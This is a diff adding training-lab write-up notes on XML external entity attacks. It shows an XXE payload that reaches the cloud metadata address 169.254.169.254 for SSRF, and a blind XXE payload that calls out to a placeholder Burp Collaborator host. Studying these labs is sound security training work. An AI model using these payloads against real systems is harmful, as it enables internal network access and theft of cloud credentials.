@@ -50,3 +50,74 @@ payload:
 
 <img width="1199" height="646" alt="image" src="https://github.com/user-attachments/assets/aa660ba5-5031-4729-8ee2-3e63c18d1d94" />
 
+
+
+
+<br><br>
+<hr>
+<br><br>
+<h2>Lab: Exploiting XXE to perform SSRF attacks</h2>
+
+This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response. 
+
+
+original:
+
+```
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+```
+
+payload:
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
+<stockCheck>
+  <productId>
+    &xxe;
+  </productId>
+  <storeId>
+  </storeId>
+</stockCheck>
+
+```
+
+<img width="1198" height="608" alt="image" src="https://github.com/user-attachments/assets/e3dec4a8-0e91-44fb-a2ba-90494df6f845" />
+
+
+<img width="1223" height="687" alt="image" src="https://github.com/user-attachments/assets/dec80acb-67a4-467e-8457-67a1ddb34834" />
+<img width="1204" height="603" alt="image" src="https://github.com/user-attachments/assets/0d452c77-0ad6-4f12-adb7-f7f73b9a36cb" />
+
+
+
+<br><br>
+<hr>
+<br><br>
+<h2>Lab: Blind XXE with out-of-band interaction</h2>
+
+<img width="673" height="375" alt="image" src="https://github.com/user-attachments/assets/7225322e-ad94-4755-880f-c7b7af9dbef3" />
+
+payload:
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLAEDRATOR-SUBDOMAIN"> ]>
+<stockCheck>
+  <productId>
+    &xxe;
+  </productId>
+  <storeId>
+  </storeId>
+</stockCheck>
+```
+
+<img width="1196" height="588" alt="image" src="https://github.com/user-attachments/assets/a4b421a1-b58a-4b5f-a40a-67276736ee93" />
+
+<img width="1195" height="603" alt="image" src="https://github.com/user-attachments/assets/48cf2a12-8ce6-4b3d-83c1-a54ff4d4ed51" />
+
+
+
+
+
+```
+
